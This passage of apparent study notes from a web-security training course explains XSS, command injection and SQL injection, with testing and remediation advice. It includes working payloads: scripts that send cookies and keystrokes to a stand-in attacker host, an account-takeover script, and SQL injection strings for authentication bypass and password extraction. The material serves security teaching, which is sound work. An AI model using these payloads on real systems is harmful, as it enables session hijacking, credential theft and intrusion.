Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged at that user. 

```<script>fetch('https://hacker.thm/steal?cookie=' +btoa(document.cookie));</script>```

### Key Logger

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>```

### Business Logic

This payload is a lot more specific than the above examples. This would be about calling a particular network resources or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called ```user.changeEmail()```. You payload could be like: ```<script>user.changeEmail('attacker@hacker.thm');</script>``` Now that the email address for the account has changed, the attacker may perform a reset password attack. The next four 

## Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

### Example Scenario:

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source. 

![image](https://user-images.githubusercontent.com/79100627/167325502-cf3b0197-b649-45b8-ae8e-c19c40f0fa4b.png)

The application does not check the contents of the error parameter, which allows the attacker to insert malicious code. 

![image](https://user-images.githubusercontent.com/79100627/167325561-397fa219-fc5f-4ee8-a125-407ba0bbf9c1.png)

The vulnerability can be used as per the scenario:
![image](https://user-images.githubusercontent.com/79100627/167325626-e0da16e1-514c-415c-bead-11e0e2ad938e.png)

### Potential Impact

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information. 

### How to test for Reflected XSS:

You will need to test every possible point of entry; these include:

- Parameters in the URL Query String 
- URL File Path 
- Sometimes HTTP Headers (although unlikely exploitable in practice) 

Once you have found some data which is being reflected in the web application, you will then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected

## Stored XSS 

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. 

### Example Scenario 

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser

![image](https://user-images.githubusercontent.com/79100627/167326028-e5f765e7-d675-4334-b10f-b0261b7f0f23.png)

### Potential Impact

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perfrom other website actions while acting as the visiting user. 

### How to test for Stored XSS

You will need to test every possbile point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
- Comments on a blog
- User profile information
- Website Listings 

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application woulnd't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting integer from a dropdown menu, but instead, you manually send the reuqest rather than using the form allowing you to try malicious payloads. 

## DOM Based XSS

### What is DOM?
 
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below.

![image](https://user-images.githubusercontent.com/79100627/167326371-3f3f52ff-c96a-4870-b244-42f2ea737280.png)

### Exploiting the DOM 

DOM based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction 

### Example Scenario 

The website's JavaScripts gets the contents from the ```window.location.hash``` parameter and then writes that onto the page in the curently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject Javascript of their choosing onto the webpage

### Potential Impact 

crafted links could sent to potential victims, redirecting them to another website or steal content from the page or the user's session

### How to test for Dom Based XSS

DOM based XSS can be challenging to test for requires a certain amount of knowledge of JavaScript to read the source code. You would need to look for parts of the code that access certain variables that an attacker can have control over such as ```window.location.x``` parameters 

When you have found those bits of code, you would then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as ```eval()``` 

## Blind XSS 

Blind XSS is similar to a stored XSS (which we covered in task 5) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

### Example Scenario

A website has a contact form where you can message a member to staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web protal 

### Potential Impact

Using the correct payload, the attacker's JS could make calls back to an attacker's website, revealing the staff protal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

### How to test for Blind XSS 

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed. 

A popular tool for Blind XSS attacker is xsshunter. Although it is possible to make your own tool in java script, this tool will automatically capture cookies, URLS, page contents and more. 

## Command Injection

Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named ```joe``` will execute commands under this ```joe``` user - and therefore obtain any permissions that ```joe``` has. 

A command injection vulnerability is also known as "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application. 

Command injection is also known as "Remote Code Execution" (RCE) because of ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data and things of that nature. 

For example, being able to abuse an application to perfrom the command ```whoami``` to list what user account the application is running will be an example of command injection. 

## Discovering Command Injection 

This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine's operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example: 

In this code snippet, the application takes data that a user enters in an input field named ```$title``` to search a directory for a song title. Let's break this down into a few simple steps. 

![image](https://user-images.githubusercontent.com/79100627/167534785-887f7cbf-d621-4162-8d08-cb467fa551bb.png)

1. The application stores MP3 files in a directory contained on the operating system.
2. The user input the song title they wish to search for. The application stores this input into ```$title``` variable
3. The data within this ```$title``` variable is passed to the command ```grep``` to search a text file named songtitle.txt for the entry of whatever the user wishees to search for.
4. The output of this search of songtitle.txt will determine whether the application informs the user that the song exists or not. 

Now, this sort of information would typically be stored in a database; however, this is just an example of where an application takes input from a user to interact with the application operating system. 

An attacker could abuse this application by injecting their own commands for the application to execute. Rather than using ```grep``` to search for an entry in ```songtitle.txt```, they could ask the application to read data from a more sensitive file. 

Abusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python 

![image](https://user-images.githubusercontent.com/79100627/167535933-369bb604-0991-4801-8f1c-ec721a13be1f.png)

- Flask package is used to set up a webserver 
- A function that uses "subprocess" package to execute a command on the device 
- We use a route in the webserver that will execute whatever is provided. For example, to execute ```whoami```, we need to visit http://flaskapp.thm/whoami

## Exploiting Command Injection

You can often determine whether or not command injection may occur by the behaviours of an application, as you will come to see in the practical session of this room. 

Application that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators ```;```, ```&``` and ```&&``` will combine two(or more) system commands and execute them both. If you are unfamiliar with this concept, it is worth checking out the Linux fundamentals module to learn more about this. 

Command injection can be detected in mostly one of two ways:

1. Blind command injection
2. Verbose command injection

![image](https://user-images.githubusercontent.com/79100627/167539093-53916993-e55a-4cf0-ac2b-9757d74a570d.png)

### Detecting Blind Command Injection

Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message. 

For this type of command injection, we will need to use payloads that will cause some time delay. For example, the ```ping``` and ```sleep``` commands are significant payloads to test with. Using ```ping``` as an example, the application will hang for x seconds in relation to how many pings you have specified.

Another method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as ```>```. For example, we can tell the web application to execute commands such as ```whoami``` and redirect that to a file. We can then use a command such as ```cat``` to read this newly created file's contents.

Testing command injection this way is often complicated and requires quite a bit of experimentation, significantly as the syntax for commands varies between Linux and Windows. 

The ```curl``` command is a great way to test for command injection. This is because you are able to use curl to deliver data and from an application in your payload. 

### Detecting Verbose Command Injection 

Detecting command injection this way is arguably the easiest method of two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed. 

For example, the output of commands such as ```ping``` or ```whoami``` is directly displayed on the web application 

### Useful payloads 

![image](https://user-images.githubusercontent.com/79100627/167540810-544433ec-be90-421d-a6fc-e0f1db7d0897.png)

![image](https://user-images.githubusercontent.com/79100627/167540826-63abba9b-8cef-499b-9de6-055a2c034e75.png)

## Remediating Command Injection 

Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user's input. I have detailed these a bit further below. The examples below are of the PHP programming language; however, the same principles can be extended to many other languages 

### Vulnerable Functions 

In PHP, many functions interact with the operating system to execute commands via shell; these include: 
- Exec
- Passthru
- System 

Take this snippet below as an example. Here, the application will accept and process numbers that are inputted into the form. This means that any commands such as ```whoami``` will not be processed.

![image](https://user-images.githubusercontent.com/79100627/167541176-cf7aaba0-9ba1-4942-bb1e-0993fe265bab.png)

1. The application will only accept specific pattern of characters (the digits 0-9)
2. The application will then only proceed to execute this data which is all numerical 

These functions take input such as a string or user data and will execute whatever is provided on the system. Any application that uses these functions without proper checks will be vulnerable to command injection 

### Input sanitisation

Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as ```>```, ```&``` and ```/```. 

In the snippet below, the ```filter_input``` PHP function is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.

![image](https://user-images.githubusercontent.com/79100627/167541524-627babe9-949c-4b97-a5a6-14a9c3cb2870.png)

### Bypassing Filters 

Applications will employ numerous techniques in filtering and sanitising data that is taken from a user's input. These filters will restrict you to specific payloads. However, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out qutation marks; we can instead use the hexadecimal value of this to achieve the same result.

When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result. 
![image](https://user-images.githubusercontent.com/79100627/167542812-3fc519e7-e8b2-44c2-b2fb-4dbf47116298.png)

## SQL (Structured Query Language) Injection

SQL injection attack is that attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging 

## What is Database?

A database is a way electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for Database Management System, DBMS's fall into two camps **Relational** or **Non- Relational**. 

With DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You would store this information seperately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team. 

![image](https://user-images.githubusercontent.com/79100627/168383984-83d7528d-af0f-4d8e-984b-129c039c4e34.png)

### What are the tables 

A tables is made up of columns and rows, a useful way to imagine a table is like a grid with the columns going accross the top from left to right containing the name of the cell and the rows going from top to bottom with each one having the actual data. 

### Columns 

Each columns, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string "hello world" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a **Key** field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries. 

### Rows

Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed. 

### Relational Vs. Non-Relational Databases

A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and causes a relationship between the tables, hence the name **relational database** . 

Non relational database sometimes called NoSQL on the other hand is any sort of database that does not use tables columns and rows to store the data, a specific database layout does not need to be constructed so each row of data can contain different information which can give more flexibility over a relational database. Some popular database of this type are MongoDB, Cassandra and ElasticSearch. 

## What is SQL Injection?

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

### What does it look like?

Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they are ready for public release. The URL for each blog entry may look something like 

``` https://website.thm/blog?id=1```

From the URL above, you can see that the blog entry been selected comes from the id parameter in query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following 

```SELECT * from blog where id=1 and private=0 LIMIT 1; ```

From what you've learned in the previous task, you should be able to work out that SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match. 

As was mentioned at the start of this task, SQL injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query 

Lets pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL: 

```https://website.thm/blog?id=2;--```

Which would then, in turn, produce SQL statement:

```SELECT * from blog where id=2;-- and private=0 LIMIT 1;```

The semicolon in the URL signifies the end of SQL statement, and the two dashes causes everything afterwards to be treted as comment. By doing this, you're just running the query:

```SELECT * from blog where id=2;--```

Which will return the article with an id of 2 whether it is set to public or not.

This was just one example of an SQL injection vulnerability of a type called In - Band SQL Injection; there are 3 types in total In-Band, Blind and Out Of Band, which we will discuss over the next tasks. 

## IN-Band SQLi 

### In-Band SQL injection

In band SQL injection is easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page. 

### Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

### Union-Based SQL Injection

This type of injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way to extracting large amounts of data via an SQL injection vulnerability.

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes (') or a quotation mark ("). 

The first thing we need to do is return data to the browswer without displaying an error message. Firstly we will try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browser id parameter to:

```1 UNION SELECT 1```

![image](https://user-images.githubusercontent.com/79100627/168390795-cd04524e-9c34-40d3-9854-0254202cf40c.png)

This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column

```1 UNION SELECT 1,2```

Same error again, so let's repeat by adding another column 

```1 UNION SELECT 1,2,3``` 

Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0 

``` 0 UNION SELECT 1,2,3 ``` 

![image](https://user-images.githubusercontent.com/79100627/168391252-97658fe0-8568-46da-b553-7ce501d8b5c7.png)

You will now see the article just made up of the result from the UNION select returning the column values 1,2, and 3. We can start using these returned values to retrieve more useful information. First, we will get the database name that we have to access to: 

``` 0 UNION SELECT 1,2,database() ```

![image](https://user-images.githubusercontent.com/79100627/168391310-76896cb0-ecd9-4eba-9d38-aa4dfd092e92.png)

You will now see where the number 3 was previously displayed; it now shows the name of database which is sqli_one

```0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'```

![image](https://user-images.githubusercontent.com/79100627/168391940-457f97f5-9177-4ecf-9abe-931e47589af9.png)


There are couple of new things to learn in this query. Firstly, the method group_concat() gets the specified colum (in our case, table_name) from multiple returned rows and puts it into one string seperated by commas. The next thing is **information_schema** database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we are interested in listing all tables in the **sqli_one** database, which is article and staff_users. 

As the first level aims to discover the Martin's password, the staff_users table is what is of intrest to us. We can utilise the information_schema database again to find the structure of this table using the below query. 

```0 UNION SELECT 1,2,group_concat(column-name) FROM information_schema.columns WHERE table_name = 'staff_users'```

This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the **table_name** column has value of **staff_users**. 

The query results provide three colums for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information

![image](https://user-images.githubusercontent.com/79100627/168392347-544492da-4d3c-4e7a-a8eb-b2f042ae2a03.png)

```0 UNION SELECT 1,2,group_concat(username,":",password SEPARATOR '<br>') FROM staff_users```

Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added, ':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be a separate line to make for easier reading. 

![image](https://user-images.githubusercontent.com/79100627/168392648-368b7850-983d-4dfe-b893-d2ae30a69763.png)

## Blind SQLi - Authentication Bypass

### Blind SQLi 

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in factm successful or not, this is because the error message have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database. 

### Authentication Bypass 

One of the most straightforward Blind SQL injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that intrested in retreiving data from the database; we just want to get past the login. 

Login forms that are connected to database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the user table. In basic terms, the web application is asking database " do you have a user with the username bob and password bob123?" and the database replies with either yes or no and depending on that answer, dictates whether the web application lets you proceed or not.

Taking the above information into account, it's unnecessary to enumerate valid username/password pair. We just need to create a database query that replies with a yes/true

To make this into query that always return as true, we can enter the following into the password field:

```' OR 1=1;--```

Which turns the SQL query into the following:

```SELECT * from users where username='' and password='' OR 1=1;```

## Blind SQLi- Boolean Based

### Boolean Based 

Boolean based SQL Injection refers to the response we recieve back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcome. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, infact, with just these two responses, it's possible to enumerate whole database structure and contents

Like previous levels, oru first task is to establish the number of columns in the user table, which we can achieve by using the UNION statement. Change the username value to the following: 

```admin123' UNION SELECT 1;--```

As the web application has responded with the value taken as false, we can confirm this is incorrect value of columns keep on adding more columns until we have a taken value of true. 

```admin123' UNION SELECT 1,2,3;--```

![image](https://user-images.githubusercontent.com/79100627/168395089-9f5ad0ab-3061-48c6-bef3-ee13843e92b2.png)

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return true status.

![image](https://user-images.githubusercontent.com/79100627/168395270-1b1d6d9d-2585-4d67-a805-d8c30f776724.png)

We get the true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a% you will see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match.

Now you move onto the next character of the database name for example, 'sa%',... 

We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:

```admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--```

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three , and the table name begins with the letter a. 

```admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--```

Lastly, we now need to enumerate the column names in the user table so we can properly search it for login credentials. Again using the information_schema database and the information we've already gained, we can start querying it for column names. 

```admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like '%a' and COLUMN_NAME !='id';```

Repeating this process three times will enable you to discover the colums id, username and password

```admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 3845```


## Blind SQLi -Time Based

### Time-Based 

A time based blind SQL Injection is very similar to the above boolean based, in that the same requests are sent, but there is no visual indicator of your quries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon successful UNION SELECT statement 

So for example, when trying to establish the number of columns in a table, you would use the following query:

```admin123' UNION SELECT SLEEP(5);--```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column: 

```admin123' UNION SELECT SLEEP(5),2;--```

This payload should have produced a 5 second time delay, which confirms the successful execution of the UNION statement and that there are two columns.

You can now repeat enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.

```referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';-- ```







